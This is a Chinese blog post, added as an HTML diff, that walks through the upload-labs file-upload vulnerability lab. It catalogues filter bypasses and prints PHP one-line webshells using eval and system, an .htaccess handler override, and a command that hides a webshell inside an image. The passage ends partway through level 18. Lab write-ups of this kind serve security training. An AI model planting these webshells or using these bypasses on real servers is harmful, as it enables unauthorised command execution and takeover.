@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>三十八，文件上传漏洞 | Hexo</title>
+  <meta name="description" content="一、文件上传漏洞类型汇总 类型：1.无限制：（1）直接用1.php放一句话木马上传 123&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;    2.绕过前端：（1）Javascript绕过： 浏览器设置中选择禁用javascript即可  （2）抓包修改： burpsuite抓包后修改filename  3.绕过服务端：（1）黑名单绕过： 例如：不允许p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="三十八，文件上传漏洞">
+<meta property="og:url" content="http://example.com/2024/01/20/%E4%B8%89%E5%8D%81%E5%85%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="baiQstar的博客">
+<meta property="og:description" content="一、文件上传漏洞类型汇总 类型：1.无限制：（1）直接用1.php放一句话木马上传 123&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;    2.绕过前端：（1）Javascript绕过： 浏览器设置中选择禁用javascript即可  （2）抓包修改： burpsuite抓包后修改filename  3.绕过服务端：（1）黑名单绕过： 例如：不允许p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115190525.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954877.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109171344.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109110625.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111203.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111220.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111854.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109112123.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109112328.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954831.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109141509.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954742.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109151633.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954328.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954084.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954519.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954097.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115193711.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954519.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954932.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954092.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115195427.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115200208.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115200519.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109192444.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109192801.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109193207.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955836.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955121.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955712.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955747.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110164910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165102.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165525.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165626.png">
+<meta property="article:published_time" content="2024-01-20T11:52:34.000Z">
+<meta property="article:modified_time" content="2024-01-20T11:55:54.684Z">
+<meta property="article:author" content="白易安">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115190525.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2024/01/20/%E4%B8%89%E5%8D%81%E5%85%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="baiQstar的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/baiQstar" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">白易安</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">往事如叶，飘散随风</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/baiQstar" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">一月 2024</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">十二月 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">22</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%89%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="title">四十三，命令执行漏洞</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:25:59.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%BA%8C%EF%BC%8CXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" class="title">四十二，XSS跨站脚本攻击</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:24:40.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%E4%B8%80%EF%BC%8CHackademic-RTB1%E9%9D%B6%E6%9C%BA/" class="title">四十一，Hackademic.RTB1靶机</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:23:04.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E5%9B%9B%E5%8D%81%EF%BC%8CWireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/" class="title">四十，Wireshark抓包分析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:21:37.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/20/%E4%B8%89%E5%8D%81%E4%B9%9D%EF%BC%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA/" class="title">三十九，目录扫描靶机</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-20T12:12:53.000Z" itemprop="datePublished">2024-01-20</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-三十八，文件上传漏洞" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      三十八，文件上传漏洞
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2024/01/20/%E4%B8%89%E5%8D%81%E5%85%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+	  <time datetime="2024-01-20T11:52:34.000Z" itemprop="datePublished">2024-01-20</time>
+	</a>
+</span>
+        
+        
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/01/20/%E4%B8%89%E5%8D%81%E5%85%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2><span id="一-文件上传漏洞类型汇总">一、文件上传漏洞类型汇总</span></h2><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115190525.png" alt="QQ截图20240115190525"></p>
+<h3><span id="类型">类型：</span></h3><h4><span id="1无限制">1.无限制：</span></h4><p>（1）直接用1.php放一句话木马上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="2绕过前端">2.绕过前端：</span></h4><h5><span id="1javascript绕过">（1）Javascript绕过：</span></h5><ul>
+<li>浏览器设置中选择禁用javascript即可</li>
+</ul>
+<h5><span id="2抓包修改">（2）抓包修改：</span></h5><ul>
+<li>burpsuite抓包后修改filename</li>
+</ul>
+<h4><span id="3绕过服务端">3.绕过服务端：</span></h4><h5><span id="1黑名单绕过">（1）黑名单绕过：</span></h5><ul>
+<li>例如：不允许php，jsp文件上传，则使用1.php3，1.php5等上传</li>
+</ul>
+<h5><span id="2白名单绕过">（2）白名单绕过：</span></h5><ul>
+<li>例如：允许图片只允许jpg，则抓包改后缀改php为jpg</li>
+</ul>
+<h5><span id="3mime绕过">（3）MIME绕过：</span></h5><ul>
+<li>MIME通过通过检查http包的Content-Type字段来判断上传文件是否合法，所以把类型改成允许上传的格式即可</li>
+</ul>
+<h4><span id="4其他主要是懒得归类了">4.其他（主要是懒得归类了）</span></h4><h5><span id="1-大小写绕过">1-大小写绕过</span></h5><ul>
+<li>如果禁止php文件上传，把文件名改成pHp,PhP等绕过</li>
+</ul>
+<h5><span id="2-00截断绕过">2-00截断绕过</span></h5><ul>
+<li>利用解析漏洞，利用00字符截止判断，例如1.php%00.jpg,或者1.php0x00.jpg</li>
+</ul>
+<h5><span id="3-htaccess绕过">3-.htaccess绕过</span></h5><ul>
+<li>.htaccess是apache配置文件，提供自定法则让服务器运行，例如如下1.htaccess文件，上传后再上传1.png即可获得webshell</li>
+</ul>
+<h5><span id="4-双写绕过">4-双写绕过</span></h5><ul>
+<li>如果禁止php文件上传，把文件名改成1.phphpp即可，其中中间的php过滤掉后仍可成功上传</li>
+</ul>
+<h5><span id="5-点绕过">5-点绕过</span></h5><ul>
+<li>如果服务器开启了黑名单过滤，则可采用1.php.的方式（仔细看有两个点）绕过并解析</li>
+</ul>
+<h5><span id="6-空格绕过">6-空格绕过</span></h5><h5><span id="7-data绕过">7-  ::$DATA绕过</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在1.php后加上::$DATA</span><br><span class="line"> 1.php--&gt;1.php::$DATA</span><br></pre></td></tr></table></figure>
+
+
+
+<h2><span id="二-闯关">二、闯关</span></h2><h3><span id="1-第一关">1、第一关</span></h3><p>这一关仅在前端校验，且仅允许.jpg|.png|.gif文件类型上传，我们可以采用<strong>禁用js</strong>的方法</p>
+<p>web.php的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@system($_GET[a]);  </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//具体来说，代码使用了$_GET[a]来获取用户通过GET请求传递的参数值，并将该参数作为命令传递给system()函数进行执行。这样，通过在URL中传递不同的命令作为参数值，就可以在服务器上执行相应的操作系统命令。</span><br></pre></td></tr></table></figure>
+
+<p>禁用js，直接上传</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954877.png" alt="QQ截图20240109171249"></p>
+<p>输入后缀命令</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109171344.png" alt="QQ截图20240109171344"></p>
+<h3><span id="2-第二关">2、第二关</span></h3><p>我们查看源代码可以看出，本关只检查上传的<code>文件类型</code></p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109110625.png" alt="QQ截图20240109110625"></p>
+<p>我们可以使用抓包工具，抓取一下上传的数据包，先上传一个<code>web shell.php</code></p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111203.png" alt="QQ截图20240109111203"></p>
+<p>文件类型不正确，在<code>yakit手动劫持</code>，观察劫持的数据包</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111220.png" alt="QQ截图20240109111220"></p>
+<p>我们可以看到文件类型和上传的内容</p>
+<p>所以我们可以<code>修改</code>一下文件类型，将它修改成<code>允许通过</code>的类型</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111854.png" alt="QQ截图20240109111854"></p>
+<p>提交数据，直接自动放行，可以看到web shell.php文件以image&#x2F;jpeg的形式上传了</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109112123.png" alt="QQ截图20240109112123"></p>
+<p>复制图片文件链接，在浏览器打开一下输入后缀?a&#x3D;systeminfo      意思是显示系统信息</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109112328.png" alt="QQ截图20240109112328"></p>
+<h3><span id="3-第三关">3、第三关</span></h3><p>特殊环境，老版小皮</p>
+<p>这一关的话需要在配置文件httpd.conf做修改</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954831.png" alt="QQ截图20240109141434"></p>
+<p>这句话的意思是.php  .phtml   .php5 都可以解析成php文件</p>
+<p>所以我们把web shell.php修改成web shell.php5</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109141509.png" alt="QQ截图20240109141509"></p>
+<p>上传成功后即可复制图片链接验证</p>
+<h3><span id="4-第四关">4、第四关</span></h3><p>特殊环境，老版小皮</p>
+<p>这里我们需要使用到.htaccess文件，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954742.png" alt="QQ截图20240109143552"></p>
+<p>​    .htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 它里面有这样一段代码：AllowOverride None，如果我们把None改成All image-20211026115955250</p>
+<p>这一关的思路是我们建立一个.htaccess文件，在文件中写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;2.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将.htaccess文件上传</p>
+<p>把我们写了木马的文件名改为2.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@system($_GET[a]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>点击上传</p>
+<h3><span id="5-第五关">5、第五关</span></h3><p>特殊环境</p>
+<p>创建一个.user.ini文件并把它上传，内容为auto_prepend_file&#x3D;2.jpg</p>
+<p>上传并访问2.jpg(一句话木马)</p>
+<p>等待300秒访问readme.php</p>
+<h3><span id="6-第六关">6、第六关</span></h3><p>查看源代码，我们可以看到它拒绝以下的文件类型</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109151633.png" alt="QQ截图20240109151633"></p>
+<p>我们可以使用<code>大小写绕过</code>，web.PHP</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954328.png" alt="QQ截图20240109155343"></p>
+<h3><span id="7-第七关">7、第七关</span></h3><p><strong>空格绕过</strong></p>
+<p>在kkk.php后面加个空格就行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954084.png" alt="QQ截图20240115192302"></p>
+<h3><span id="8-第八关">8、第八关</span></h3><p>加个点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954519.png" alt="QQ截图20240115192714"></p>
+<h3><span id="9-第九关">9、第九关</span></h3><p>在kkk.php后面加<code>::$DATA</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954097.png" alt="QQ截图20240115193851"></p>
+<p>在蚁剑中测试连接时，需要将<code>::$DATA</code>删掉</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115193711.png" alt="QQ截图20240115193711"></p>
+<h3><span id="10-第十关">10、第十关</span></h3><p>这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行<br><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954519.png" alt="QQ截图20240115192714"></p>
+<h3><span id="11-第十一关">11、第十一关</span></h3><p>这一关黑名单，使用str_ireplace()函数寻找文件名中存在的黑名单字符串，将它替换成空（即将它删掉），可以使用双写绕过黑名单</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954932.png" alt="QQ截图20240115192302"></p>
+<h3><span id="12-第十二关">12、第十二关</span></h3><p>这一关白名单，最终文件的存放位置是以拼接的方式，可以使用%00截断，但需要<code>php版本&lt;5.3.4</code>，并且<code>magic_quotes_gpc</code>关闭。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954092.png" alt="QQ截图20240115195201"></p>
+<h3><span id="13-第十三关">13、第十三关</span></h3><p>这一关白名单，文件上传路径拼接生成，而且使用了post发送的数据进行拼接，我们可以控制post数据进行0x00截断绕过白名单</p>
+<p>在upload的位置加上<code>kkk.php空格</code></p>
+<p>把filename的kkk.php改为<code>kkk.png</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954059.png" alt="QQ截图20240115195352"></p>
+<p>把<code>20改为00</code></p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115195427.png" alt="QQ截图20240115195427"></p>
+<p>在蚁剑测试链接时，把选中的删掉</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115200208.png" alt="QQ截图20240115200208"></p>
+<h3><span id="14-第十四关">14、第十四关</span></h3><p>这一关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件使用 <code>图片马 + 文件包含</code> 绕过</p>
+<p>意思就是说<code>把木马放在图片里面上传</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\微信图片_20240115165541.jpg/b+.\kkk.php kkk666.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115200519.png" alt="QQ截图20240115200519"></p>
+<p>点击上传</p>
+<p>因为上传图片马之后会被重命名图片所以下面的payload的图片名字可以在上传之后复制图片链接就可以了</p>
+<p>构造的URL为<code>include.php?file=./upload/3820240115200610.jpg</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.154/upload-labs-master/upload-labs-master/include.php?file=./upload/3820240115200610.jpg</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="15-第十五关">15、第十五关</span></h3><p>和第十四关一样</p>
+<h3><span id="18-第十八关">18、第十八关</span></h3><p>从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，<code>unlink()</code>函数就会删除该文件。删除需要时间，只要<code>上传大于删除的速度</code>就可以访问，用造木马的马。</p>
+<p>1.发送一个造马的马，yakit抓包，发到测试器中</p>
+<p>2.访问这个造马的马，yakit抓包，发到测试器中</p>
